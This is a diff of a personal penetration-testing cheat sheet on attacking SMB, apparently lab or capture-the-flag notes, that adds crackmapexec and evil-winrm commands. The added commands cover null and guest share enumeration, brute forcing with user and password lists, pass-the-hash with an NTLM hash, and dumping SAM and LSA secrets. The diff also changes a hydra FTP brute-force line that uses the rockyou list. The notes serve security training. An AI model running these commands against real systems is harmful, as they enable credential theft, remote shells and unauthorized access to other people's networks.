@@ -8,7 +8,7 @@ enum4linux -a 192.168.200.5
 
 smbclient -L 192.168.200.5 
 smbclient -L //192.168.200.5  
-smbclient -L //192.168.127.11/ -U "guest"
+smbclient -L //192.168.200.5/ -U "guest"
 smbclient //192.168.200.5/share 
 smbclient //192.168.200.5/share -U admin  
 
@@ -17,8 +17,32 @@ smbmap -H 192.168.200.5 -R --depth 5
 smbmap -i 192.168.200.5 -u '' -p '' 
 smbmap -H 192.168.200.5 -u admin -p 'creds' -d friendzone  
 
+
+
+================================== 
+Samba: Crackmapexec 
+
+crackmapexec --help 
+crackmapexec smb 192.168.200.5
 crackmapexec smb 192.168.200.5 --shares -u '' -p '' 
-crackmapexec smb 192.168.200.5 --shares -u bob -p WowPass
+crackmapexec smb 192.168.200.5 --shares -u bob -p paxxword
+
+crackmapexec winrm 192.168.200.5
+crackmapexec winrm 192.168.200.5 -u bob -p 'paxxword' 
+
+crackmapexec smb 192.168.200.5 --pass-pol 
+crackmapexec smb 192.168.200.5 -u guest -p "" --shares 
+crackmapexec smb 192.168.200.5 -u guest -p "" -M spider_plus 
+crackmapexec smb 192.168.200.5 -d mydom -u users.txt -p pass.txt    ..brute too 
+crackmapexec smb 192.168.200.5 10.0.0.1 10.1.1.2 -u bob -p 'paxxword' --local-auth 
+crackmapexec smb 192.168.200.5 -u bob -p 'paxxword'    ..test password, get domain info 
+crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -p 'paxxword' -d mydomain 
+crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -H ntlmhash -d mydomain 
+
+evil-winrm -i 192.168.200.5 -u bob -p paxxword
+crackmapexec smb 192.168.200.5 -u bob -p 'paxxword' --shares 
+crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --sam 
+crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --lsa 
 
 
 =================================== 
@@ -27,7 +51,7 @@ Search an entire network or hosts for SMB shares, and list public-share contents
 
 =================================== 
 Reuse samba-creds for FTP
-hydra -l steph -P $rockyou 10.1.1.68 ftp
+hydra -l steph -P $rockyou 192.168.200.5 ftp
 
 
 =================================== 
